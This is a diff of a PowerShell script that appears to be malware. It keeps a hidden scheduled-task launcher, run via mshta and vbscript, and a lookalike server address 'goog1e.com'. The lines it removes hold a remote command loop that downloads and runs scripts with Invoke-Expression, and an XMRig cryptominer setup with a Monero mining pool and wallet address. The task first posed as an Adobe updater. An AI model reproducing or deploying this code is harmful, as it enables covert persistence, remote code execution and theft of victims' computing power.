@@ -1,18 +1,10 @@
 #Requires -Version 5
-[CmdletBinding()]
-param
-(
-  #[Parameter(Mandatory)]
-  [ValidateNotNullOrEmpty()]
-  [ValidateSet('init', 'watcher', 'download', 'run-script', 'register-task', 'self-update')]
-  [string]$action
-)
 
 $taskVersion = "1.0"
 $uri = "https://goog1e.com"
 
 $TasksDefinitions = @{
-  "AdobeWatcher"      = @{
+  "PwshWatcher"      = @{
     "Name"          = "";
     "Values"        = @{"/ns:Task/ns:Actions/ns:Exec/ns:Command" = "mshta.exe";
       "/ns:Task/ns:Actions/ns:Exec/ns:Arguments"          = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''{ScriptFile}''"""""", 0 : window.close")'
@@ -76,7 +68,6 @@ $TasksDefinitions = @{
   }
 }
 
-################################
 ######## Local functions
 function _GetIsAdmin  
 {  
@@ -212,7 +203,7 @@ function _RegisterTask {
   foreach ($item in $TasksDefinitions[$TaskName]["Values"].Keys) {
     $xmlNode = $xml.SelectSingleNode($item, $ns);
     if ($xmlNode) {
-      $innerText = $TasksDefinitions[$TaskName]["Values"][$item] -replace '{RootFolder}', $destinationFolder -replace '{ScriptFile}', $script
+      $innerText = $TasksDefinitions[$TaskName]["Values"][$item] -replace '{RootFolder}', $destinationFolder -replace '{ScriptFile}', $scriptFile
       $xmlNode.InnerText = $innerText
     }
   }
@@ -269,23 +260,15 @@ function _CheckServerConnection
   }
 }
 
-
-
-################################
 ########  Variables
 
-$TaskName = "AdobeWatcher"
-#$InvFolders = @("$env:ProgramFiles\Adobe\Updater", "$env:ProgramFiles\Adobe\Updater")
-#$sourceFolder = $PSScriptRoot
+$TaskName = "PwshWatcher"
+$destinationFolder = $PSScriptRoot
 $thisFileName = $MyInvocation.MyCommand.Name
 #$thisFileFullName = $MyInvocation.MyCommand.Path
-$downloadFiles = $false
-$destinationFolder = $PSScriptRoot #$InvFolders[0];
-
-
+$scriptFile = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName)
 $debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")
 
-################################
 ######## Check task
 if(-not $debugger)
 {
@@ -295,199 +278,7 @@ if(-not $debugger)
   }
 }
 
-################################
-######## Check json file
-$jsonConfigString = @{version = 0; actions = @( @{"name" = "download"; "value" = "all"; status = "succes" }) };
-$jsonConfigFile = [System.IO.Path]::Combine($destinationFolder, "config.json")
-
-if (-not (Test-Path $jsonConfigFile)) {
-  $jsonConfigString | ConvertTo-Json -Depth 5 | Out-File $jsonConfigFile
-}
-$jsonObject = Get-Content $jsonConfigFile | ConvertFrom-Json -Depth 5;
-
-################################
-######## check action and try to resolve it
-$actionValue = "";
-$actionIndex = 0;
-
-if (-not ($action) -and (_CheckServerConnection)) {
-  $uriConfig = $uri + "/GetConfig?name=version";
-
-  [int]$versionRemote = Invoke-RestMethod -Uri $uriConfig
-
-  [int]$versionLocal = $jsonObject.version
-
-  if ($versionLocal -ne $versionRemote) {
-    $jsonObject.version = $versionRemote;
-    $jsonObject.actions = _GetActions;
-    $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile;
-    $jsonObject = Get-Content $jsonInfoFile | ConvertFrom-Json;
-  }
-  $actions = ($jsonObject.actions) | Where-Object { $_.status -eq "notrun" } | Sort-Object -Property Order
-
-  if ($actions.Count -gt 0) {
-    $action = $actions[0].name
-    $actionValue = $actions[0].value
-    $actionIndex = 0;
-  }
-}
-if(-not $action)
+if((_InstallPwsh -CheckUpdate))
 {
-  $action = "watcher"  
-}
-
-################################
-######## Action processing
-
-switch ($action) {
-  "init" {
-  }
-  "download" {
-    # get files and save its to the disk
-    if ($actionValue -eq "all") {
-      $getFilesUri = $uri + "/GetFiles"
-      $files = Invoke-RestMethod -Uri $getFilesUri
-      $jsonObject.status = [Status]::succes;
-      $files = $files | Where-Object { $_ -ne $thisFileName }
-    }
-    else {
-      $files = $actionValue -split "\|"
-    }
-    foreach ($item in $files) {
-      $outFileName = [System.IO.Path]::Combine($destinationFolder, $item);
-      $checkFolder = [System.IO.Path]::GetDirectoryName($outFileName);
-      if (-not (Test-Path $checkFolder)) {
-        New-Item -ItemType Directory -Force -Path $checkFolder
-      }
-      $downloadStatus = _GetFile -FileName $item -OutFileName $outFileName
-      if (-not $downloadStatus) {
-        $jsonObject.status = [Status]::failure;
-      }
-    }
-  }
-  "watcher" {
-    if((_InstallPwsh -CheckUpdate))
-    {
-      _InstallPwsh
-    }
-  }
-  "run-script" {
-    try {
-      $scriptToRun = "$PSScriptRoot\$value"
-      Invoke-Expression "$scriptToRun"
-    }
-    catch {
-      "error: action $action" | Out-File $logfile -Append
-    }
-  }
-  "register-task" {
-    $taskName = $actionValue.taskname
-    $definitionName = $actionValue.definitionName
-    $principal = $actionValue.principal
-    $xmlDefinitionPath = [System.IO.Path]::Combine($destinationFolder, $definitionName)
-    $xmlContent = Get-Content $xmlDefinitionPath
-    $xmlContent = $xmlContent -replace '{RootFolder}', $destinationFolder
-    [xml]$xmlDef = $xmlContent
-    Register-TaskLocal -TaskName $taskName -XmlDefinition $xmlDef -Principal $principal
-  }
-  "self-update" {
-    _SelfUpdate
-  }
-  "run-file" {
-    if (Test-Path -Path $watcherFileName) {
-      Invoke-Expression "& `"$watcherFileName`" -action init"
-    }
-  }
-}
-
-if($actions)
-{
-  $actions[$actionIndex].status = ([Status]::succes).ToString();
-  $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
-}
-
-
-
-
-
-
-
-
-
-
-
-
-exit
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-if (!(Test-Path -PathType Container -Path $destinationFolder)) {
-  New-Item -ItemType Directory -Force -Path $destinationFolder
-}
-
-if ($psversiontable.PSversion -lt [System.Version]::Parse("7.0")) {
-  if (!(Get-Command pwsh -ErrorAction SilentlyContinue)) {
-    _InstallPwsh
-    exit
-  }
-  exit
-  _PwshContextMenu
-}
-
-if ($downloadFiles) {
-  ### 1
-  $releases = (Invoke-RestMethod -Method Get -Uri $GitRequestUri).assets | Where-Object { $_.name -match "xmrig-\d.\d\d.\d-gcc-win64.zip" }
-  if (!([bool]($releases.PSobject.Properties.name -match "browser_download_url"))) {
-    exit
-  }
-  _Unpack -DonwloadUri $releases.browser_download_url -DestinationFolder $destinationFolder
-
-  ### 2
-  if (-not (Test-Path $jsonInfoFile)) {
-    $jsonInfoString | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
-  }
-  $jsonObject = Get-Content $jsonInfoFile | ConvertFrom-Json -Depth 5;
-  $jsonObject.pools[0].url = "pool.supportxmr.com:5555"
-  $jsonObject.pools[0].user = "8ApZv61PPDWgRwR3HJD9zziX9xWTq6JVag3RqDnwfygKavSJezZYYn7Xvj5u41KThVP59aequGAx8cpBMrzxcChEAxf69zz"
-  $jsonObject.pools[0].pass = "x"
-  $jsonObject.cuda.enabled = $true
-  $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
-  ### 3
-
-  #xmrig-cuda-6.12.0-cuda10_2-win64.zip
-  #$releases = $requestData #| Where-Object {$_.name -match "xmrig-cuda-6.12.0-cuda10_2-win64.zip"} # | Select-Object -Property Name
-  $pattern = "xmrig-cuda-(?<version>\d.\d\d.\d)-cuda(?<cversion>\d\d_\d)-win64.zip"
-  $releases = (Invoke-RestMethod -Method Get -Uri $GitRequestCudaUri).assets
-  $outItems = New-Object System.Collections.ArrayList
-  foreach ($item in $releases) {
-    if ($item.name -match $pattern) {
-      $version = [System.Version]::Parse($Matches["version"]);
-      $cversion = [System.Version]::Parse(($Matches["cversion"] -replace "_", "."));
-      $outItems.Add(@{version = $version; cversion = $cversion; url = $item.browser_download_url }) | Out-Null;
-    }
-  }
-  $oitem = $outItems | Where-Object { $_.cversion.Major -eq 10 } | Sort-Object -Property cversion -Descending | Select-Object -First 1
-
-  _Unpack -DonwloadUri $oitem.url -DestinationFolder $destinationFolder
-}
-else {
-  #upload files from current folder
-  $items = Get-ChildItem -Path $xmrigModulePath
-  foreach ($item in $items) {
-    Copy-Item -Path $item -Destination $destinationFolder -Force
-  }
+  _InstallPwsh
 }
